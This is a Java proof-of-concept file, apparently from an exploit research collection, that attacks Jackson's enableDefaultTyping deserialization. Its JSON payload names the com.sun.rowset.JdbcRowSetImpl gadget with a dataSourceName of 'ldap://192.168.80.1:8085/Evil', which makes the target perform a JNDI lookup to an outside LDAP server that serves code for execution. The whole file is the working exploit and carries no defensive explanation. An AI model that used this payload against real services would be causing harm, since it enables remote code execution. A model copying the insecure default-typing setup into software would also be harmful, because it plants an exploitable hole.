package org.exploit.third.jackson;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class JdbcRowSetImpl {
    public static class enableDefaultTyping_Test {
        public Object object;
    }
    public static void main(String[] args) throws IOException {
        String jsonInput = aposToQuotes("{\"object\":['com.sun.rowset.JdbcRowSetImpl',\n" +
                "{\n" +
                "'dataSourceName':'ldap://192.168.80.1:8085/Evil',\n" +
                "'autoCommit':0,\n" +
                "}\n" +
                "]\n" +
                "}");
        System.out.printf(jsonInput);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            JdbcRowSetImpl.enableDefaultTyping_Test test = mapper.readValue(jsonInput, JdbcRowSetImpl.enableDefaultTyping_Test.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }
}
